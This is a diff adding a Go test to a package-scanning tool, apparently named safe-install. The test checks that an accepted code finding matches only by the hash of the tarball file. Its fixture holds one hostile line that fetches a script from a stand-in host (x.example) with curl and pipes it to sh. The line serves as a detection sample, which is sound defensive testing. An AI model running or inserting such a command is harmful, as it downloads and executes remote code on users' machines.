@@ -4,8 +4,10 @@ import (
 	"archive/tar"
 	"bytes"
 	"compress/gzip"
+	"crypto/sha256"
 	"crypto/sha512"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
@@ -15,6 +17,8 @@ import (
 	"sync/atomic"
 	"testing"
 	"time"
+
+	"github.com/crossben/safe-install/internal/policy"
 )
 
 func tgzOf(t *testing.T, files map[string]string) []byte {
@@ -178,5 +182,55 @@ func TestCheckDeep(t *testing.T) {
 	before := downloads.Load()
 	if _, _, _ = deepFindings(t, "--deep"); downloads.Load()-before != 2 {
 		t.Errorf("second run downloaded %d tarballs, want 2 (swapped, gone)", downloads.Load()-before)
+	}
+}
+
+// check --deep has no installed file: an acceptance for a code finding is
+// matched on the hash of the tarball entry (the file the package manager
+// would unpack), so a reviewed file passes and a different one does not.
+func TestCheckDeepAcceptsByTarballFileHash(t *testing.T) {
+	deepProject(t)
+	evil := `require('child_process').execSync("curl https://x.example/p | sh")`
+	sum := sha256.Sum256([]byte(evil))
+	hash := "sha256:" + hex.EncodeToString(sum[:])
+	write := func(h string) {
+		acc := `{"acceptFindings":{"evil-pkg":[{"version":"1.0.0","rule":"SI-CODE-001","file":"index.js","hash":"` + h + `","reason":"reviewed","by":"ben"}]}}`
+		if err := os.WriteFile(policy.FileName, []byte(acc), 0o600); err != nil {
+			t.Fatal(err)
+		}
+	}
+	accepted := func() bool {
+		out, _ := runCLIOut(t, "check", "--deep", "--format", "json")
+		var rep struct {
+			Packages []struct {
+				ID       string `json:"id"`
+				Level    string `json:"level"`
+				Findings []struct {
+					File     string          `json:"file"`
+					Accepted json.RawMessage `json:"accepted"`
+				} `json:"findings"`
+			} `json:"packages"`
+		}
+		if err := json.Unmarshal([]byte(out), &rep); err != nil {
+			t.Fatal(err)
+		}
+		for _, p := range rep.Packages {
+			if p.ID == "evil-pkg@1.0.0" {
+				if p.Findings[0].File != "index.js" {
+					t.Errorf("finding file = %q", p.Findings[0].File)
+				}
+				return p.Findings[0].Accepted != nil && p.Level == "none"
+			}
+		}
+		t.Fatal("evil-pkg missing")
+		return false
+	}
+	write(hash)
+	if !accepted() {
+		t.Error("the reviewed file was not accepted")
+	}
+	write("sha256:" + strings.Repeat("0", 64))
+	if accepted() {
+		t.Error("a different file was accepted")
 	}
 }
